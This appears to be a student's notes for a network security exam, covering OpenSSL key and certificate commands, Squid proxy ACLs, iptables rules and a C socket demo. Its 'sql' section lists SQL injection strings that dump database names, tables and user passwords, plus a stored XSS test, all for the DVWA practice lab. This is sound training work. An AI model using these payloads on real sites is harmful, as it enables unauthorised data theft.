xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
ca
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx


//copy openssl.cnf from /etc/pki/tls/


mkdir CA client

├── CA
├── client
└── openssl.cnf

cd CA

////// create private key for CA

openssl genrsa -out CA_Private.key -aes256 -passout stdin 2048

////// getting public key for CA

openssl rsa -in CA_Private.key -out CA_Public.key -pubout


cd ..
cd client

////// create private key for Client

openssl genrsa -out Client_Private.key -aes256 -passout stdin 2048

////// getting public key for Client

openssl rsa -in Client_Private.key -out Client_Public.key -pubout


├── CA
│   ├── CA_Private.key
│   └── CA_Public.key
├── client
│   ├── Client_Private.key
│   └── Client_Public.key
└── openssl.cnf



cd CA

/// creating CA certificate req

openssl req -new -key CA_Private.key -out CA_req.csr



//view text


openssl req -in CA_req.csr -text


// create CA certificate 


openssl x509 -req -in CA_req.csr -extfile ../openssl.cnf -extensions v3_ca -out CA_certificate.cert -signkey CA_Private.key 


cd ../client

/// creating Client certificate req

openssl req -new -key Client_Private.key -out Client_req.csr



//creating Client Certificate 


openssl x509 -req -in Client_req.csr -out Client_certificate.cert -extfile ../openssl.cnf -extensions  usr_cert -CA ../CA/CA_certificate.cert -CAkey ../CA/CA_Private.key -CAcreateserial




├── CA
│   ├── CA_certificate.cert
│   ├── CA_Private.key
│   ├── CA_Public.key
│   └── CA_req.csr
├── client
│   ├── Client_certificate.cert
│   ├── Client_Private.key
│   ├── Client_Public.key
│   └── Client_req.csr
└── openssl.cnf



//verify client certificate


openssl verify -CAfile ../CA/CA_certificate.cert Client_certificate.cert 
















xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
squid
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

//install squid

yum install squid


// go to squid dir
 
cd /etc/squid


// backup squid.conf

cp squid.conf squid.conf.backup


// edit squid.conf to : /////////////////////////////


acl localnet src 10.0.2.15/24		# RFC 1918 local private network (LAN), your ip here

acl Safe_ports port 80		# http

http_access deny !Safe_ports

http_access allow localhost manager
http_access deny manager

http_access allow localnet
http_access allow localhost

http_access deny all

http_port 3128

coredump_dir /var/spool/squid

refresh_pattern ^ftp:		1440	20%	10080
refresh_pattern ^gopher:	1440	0%	1440
refresh_pattern -i (/cgi-bin/|\?) 0	0%	0
refresh_pattern .		0	20%	4320


/////////////////////////////////////////////////////



// to check if squid is running 

netstat -tap


// to stop squid 

systemctl stop squid


// to start squid

systemctl start squid



// to change selinux enf

sestatus

setenforce 0




/// change squid.conf file for : 


///// block one site or more on same line

acl localnet src 10.0.2.0/24		# RFC 1918 local private network (LAN)

acl block_site dstdomain .dst.gov.in nptel.ac.in

acl Safe_ports port 80		# http

http_access deny !Safe_ports
http_access deny block_site

http_access allow localhost manager
http_access deny manager

http_access allow localnet
http_access allow localhost

http_access deny all

http_port 3128

coredump_dir /var/spool/squid

/////////////////////////////////////////



/// block all except given site for given user 

auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid.users

acl localnet src 10.0.2.0/24		# RFC 1918 local private network (LAN)

acl block_site dstdomain .gov.in
acl alluser proxy_auth REQUIRED
acl block_boi1 proxy_auth boi1

acl Safe_ports port 80		# http

http_access deny !Safe_ports
http_access deny block_boi1 !block_site
http_access allow alluser

http_access allow localhost manager
http_access deny manager

http_access allow localnet
http_access allow localhost

http_access deny all

http_port 3128

coredump_dir /var/spool/squid

//////////////////////////////////////////


///// block for time 


auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid.users

acl localnet src 10.0.2.0/24		# RFC 1918 local private network (LAN)

acl block_site dstdomain .gov.in
acl alluser_time_avil time 01:39-01:43
acl alluser proxy_auth REQUIRED
acl block_boi1 proxy_auth boi1
acl block_boi2 proxy_auth boi2

acl Safe_ports port 80		# http

http_access deny !Safe_ports
http_access deny block_boi1 !block_site
http_access deny block_boi2 block_site
http_access deny alluser !alluser_time_avil
http_access allow alluser

http_access allow localhost manager
http_access deny manager

http_access allow localnet
http_access allow localhost

http_access deny all

http_port 3128

coredump_dir /var/spool/squid

//////////////////////////////////////








xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
iptables_squid_transpernt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx


#iptables-save>firewall.backup
iptables -F
iptables -X

iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -P FORWARD DROP
iptables -I OUTPUT -j ACCEPT
iptables -I INPUT -m conntrack --ctstate E,R -j ACCEPT
iptables -t nat -I OUTPUT -p tcp --dport 80 -m owner ! --gid-owner 23 -j REDIRECT --to-ports 3129
iptables -I INPUT -i lo -j ACCEPT
iptables -I OUTPUT -o lo -j ACCEPT





xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
iptables
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx


#iptables-save>firewall.backup
iptables -F
iptables -X

iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -P FORWARD DROP
iptables -I OUTPUT -j ACCEPT
iptables -I INPUT -m conntrack --ctstate E,R -j ACCEPT





xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
openssl
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx


openssl rand -out symkey.pem 256


openssl list -cipher-algorithms

openssl enc -aes-256-cbc -in text.txt -out text_enc.txt -e -iv 0e88c0cec129b760678bb6dfcda68rm90b -kfile symkey.pem

openssl dgst -sha256 -out hash.txt text_enc.txt

openssl dgst -sha256 -hmac okok -out hash.txt text_enc.txt

openssl genrsa -aes256 -passout stdin -out rsakey.key 2048

openssl rsa -in rsakey.key -text

openssl rsa -in rsakey.key -out rasPub.key -pubout

openssl rsa -in rasPub.key -text -pubin

openssl dgst -sha256 -sign rsakey.key -out rsasign.sign text_enc.txt

openssl dgst -sha256 -verify rasPub.key -signature rsasign.sign text_enc.txt







xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
squid extra
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/.squid.user

acl localnet src 192.168.2.0/24		# RFC 1918 local private network (LAN)

acl block_site_group1 dstdomain .gov.in
acl block_site_group2 dstdomain .ac.in

acl alluser_auth_time time 11:00-11:44
acl someuser_auth_time time 12:00-12:55

acl alluser proxy_auth REQUIRED
acl block_boi3 proxy_auth boi3
acl block_vk proxy_auth vk

acl Safe_ports port 80		# http

http_access deny !Safe_ports
http_access deny block_boi3 someuser_auth_time
http_access deny block_vk someuser_auth_time

http_access deny block_boi3 !block_site_group1 
http_access deny block_vk !block_site_group2

http_access allow block_boi3
http_access allow block_vk

 

http_access allow localhost manager
http_access deny manager

http_access allow localnet
http_access allow localhost

http_access deny all

http_port 3128

coredump_dir /var/spool/squid

refresh_pattern ^ftp:		1440	20%	10080
refresh_pattern ^gopher:	1440	0%	1440
refresh_pattern -i (/cgi-bin/|\?) 0	0%	0
refresh_pattern .		0	20%	4320








xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
client server
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

// Server side C/C++ program to demonstrate Socket programming
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>
#define PORT 8722
int main(int argc, char const *argv[])
{
    int server_fd, new_socket, valread;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[1024] = {0};
    char *hello = "Hello from server";
      
    // Creating socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
    {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }
      
    // Forcefully attaching socket to the port 8080
    /*if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
                                                  &opt, sizeof(opt)))
    {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }*/
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons( PORT );
      
    // Forcefully attaching socket to the port 8080
    if (bind(server_fd, (struct sockaddr *)&address,sizeof(address))<0)
    {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }
    if (listen(server_fd, 3) < 0)
    {
        perror("listen");
        exit(EXIT_FAILURE);
    }
    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, 
                       (socklen_t*)&addrlen))<0)
    {
        perror("accept");
        exit(EXIT_FAILURE);
    }
    valread = read( new_socket , buffer, 1024);
    printf("%s\n",buffer );
    send(new_socket , hello , strlen(hello) , 0 );
    printf("Hello message sent\n");
    return 0;
}







////////






// Client side C/C++ program to demonstrate Socket programming
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>
#define PORT 8722
  
int main(int argc, char const *argv[])
{
    struct sockaddr_in address;
    int sock = 0, valread;
    struct sockaddr_in serv_addr;
    char *hello = "Hello from client";
    char buffer[1024] = {0};
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        printf("\n Socket creation error \n");
        return -1;
    }
  
    memset(&serv_addr, '0', sizeof(serv_addr));
  
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
      
    // Convert IPv4 and IPv6 addresses from text to binary form
    if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)<=0) 
    {
        printf("\nInvalid address/ Address not supported \n");
        return -1;
    }
  
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        printf("\nConnection Failed \n");
        return -1;
    }
    send(sock , hello , strlen(hello) , 0 );
    printf("Hello message sent\n");
    valread = read( sock , buffer, 1024);
    printf("%s\n",buffer );
    return 0;
}


xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
sql
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx


FINAL EXAM--> Dom xss and reflexive xss

1.firewall

2.os/app hard

3. IDS/IPS

4.PEN testing
Download XAMPP, DVWA
Username: admin
Password: password

XAMPP- start xampp
	-Start apache and mysql
DVWA-got  to config file and change config.inc.php .dst to config.inc.php
	-open DVWA in browser --> http://localhost/DVWA-master
	- click on create or reset database.
	- DVWA Security change Security Level to LOW and submit.


PART 1- SQL INJECTION

REFER CHAPTER 6 https://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson6/index.html 
1. Display Database Version
==> -%' or 0=0 union select null, version() #

2. Display Database User
==> %' or 0=0 union select null, user() #

3. Display Database Name
==> %' or 0=0 union select null, database() #

4. Display all tables in information_schema
==> %' and 1=0 union select null, table_name from information_schema.tables #

5. Display all the user tables in information_schema
==> %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#

6. Display all the columns fields in the information_schema user table
==> %' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #

7. Display all the columns field contents in the information_schema user table
==> %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #



John the ripper
https://www.openwall.com/john/  --> John the Ripper 1.8.0-jumbo-1 (Windows binaries, ZIP, 34 MB) 
-Create Password Hash File
-Save password hash file in Run folder 
(Format (.txt file)--> Username:hashed password )
-Open cmd and got to

PART 2- XSS(STORED)
Refer: https://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson9/index.html 
Section 10: XSS Stored Basic Exploit Test

NOTE: POPUPS ENABLE OF THE BROWSER

Basic XSS test
a. Name: Test 1
b. Message: <script>alert("This is a XSS Exploit Test")</script>
c. Click Sign Guestbook
Result--> popup will be shown of the given message in the script tag




xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
end
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx


generate keys:

openssl genrsa -aes256 -passout stdin -out my_rsa.key

openssl rsa -in my_rsa.key -out my_pub.key -pubout

session key:

openssl rand -out sec.key 32

sessionkey enc using public key:

openssl rsautl -in sec.key -out enc_sec.key -encrypt -inkey my_pub.key -pubin

openssl enc -aes-256-cbc -in file.txt -out enc_file.txt -e -pass file:sec.key 

enc -aes-256-cbc -in enc_file.txt -out dec_file.txt -d -pass file:sec.key

openssl dgst -sha256 -sign my_rsa.key -out file_signature.sign file.txt

openssl dgst -verify my_pub.key -signature file_signature.sign file.txt 

	


